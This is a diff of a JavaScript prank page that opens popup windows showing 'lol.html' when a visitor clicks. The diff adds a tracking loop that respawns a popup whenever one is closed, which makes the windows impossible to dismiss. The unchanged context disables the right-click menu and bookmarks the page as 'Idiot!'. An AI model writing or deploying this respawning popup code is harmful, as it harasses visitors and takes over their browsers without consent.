@@ -1,7 +1,3 @@
-/* Prevent multiple activations */
-let tabsOpened = false;
-let popups = [];
-
 /* Optional audio setup */
 document.addEventListener('click', musicPlay);
 
@@ -20,9 +16,7 @@ function musicPlay() {
         }
     }
 
-    /* Open popups ONCE */
-    openTwoTabs();
-
+    openInitialTabs();
     document.removeEventListener('click', musicPlay);
 }
 
@@ -36,78 +30,52 @@ faudio.addEventListener('timeupdate', function () {
     }
 });
 
+/* Popup tracking */
+let popups = [];
+
 /* Open popup window */
-function openWindow(url, x, y) {
+function openWindow(x, y) {
     const width = 357;
     const height = 330;
 
-    return window.open(
-        url,
+    const win = window.open(
+        "lol.html",
         "_blank",
         `menubar=no,status=no,toolbar=no,resizable=yes,
         width=${width},height=${height},
         left=${x},top=${y}`
     );
+
+    trackPopup(win);
+    return win;
 }
 
-/* Open 4 bouncing popups */
-function openTwoTabs() {
-    if (tabsOpened) return;
-    tabsOpened = true;
+/* Track and respawn on close */
+function trackPopup(win) {
+    const checker = setInterval(() => {
+        if (!win || win.closed) {
+            clearInterval(checker);
+            spawnOnePopup();
+        }
+    }, 1000);
+}
 
+/* Spawn one popup at random position */
+function spawnOnePopup() {
     const width = 357;
     const height = 330;
 
-    for (let i = 0; i < 4; i++) {
+    let x = Math.random() * (screen.width - width);
+    let y = Math.random() * (screen.height - height);
 
-        let x = Math.random() * (screen.width - width);
-        let y = Math.random() * (screen.height - height);
-
-        let dx = (Math.random() * 6 + 3) * (Math.random() < 0.5 ? 1 : -1);
-        let dy = (Math.random() * 6 + 3) * (Math.random() < 0.5 ? 1 : -1);
-
-        let win = openWindow("lol.html", x, y);
-
-        popups.push({
-            win,
-            x,
-            y,
-            dx,
-            dy,
-            width,
-            height
-        });
-    }
-
-    startBouncing();
+    openWindow(x, y);
 }
 
-/* DVD-style bouncing movement */
-function startBouncing() {
-    setInterval(() => {
-
-        popups.forEach(p => {
-            if (!p.win || p.win.closed) return;
-
-            p.x += p.dx;
-            p.y += p.dy;
-
-            if (p.x <= 0 || p.x + p.width >= screen.width) {
-                p.dx *= -1;
-            }
-
-            if (p.y <= 0 || p.y + p.height >= screen.height) {
-                p.dy *= -1;
-            }
-
-            try {
-                p.win.moveTo(p.x, p.y);
-            } catch (e) {
-                // ignored (browser restrictions)
-            }
-        });
-
-    }, 20);
+/* Initial 4 popups */
+function openInitialTabs() {
+    for (let i = 0; i < 4; i++) {
+        spawnOnePopup();
+    }
 }
 
 /* Optional title changer */
@@ -121,9 +89,7 @@ function bookmark() {
         navigator.appName == "Microsoft Internet Explorer" &&
         parseInt(navigator.appVersion) >= 4
     ) {
-        var url = "lol.html";
-        var title = "Idiot!";
-        window.external.AddFavorite(url, title);
+        window.external.AddFavorite("lol.html", "Idiot!");
     }
 }
 
@@ -132,26 +98,7 @@ window.oncontextmenu = function () {
     return false;
 };
 
-/* Removed keyboard UwU alert */
-window.onkeydown = function (event) {
-    var keyCode = event.keyCode;
-
-    if (
-        keyCode == 17 ||
-        keyCode == 18 ||
-        keyCode == 46 ||
-        keyCode == 115
-    ) {
-        console.log("Key blocked");
-    }
-
-    return null;
-};
-
-/* Removed beforeunload warning */
-
 /* Startup */
 window.onload = function () {
     bookmark();
-    return true;
 };
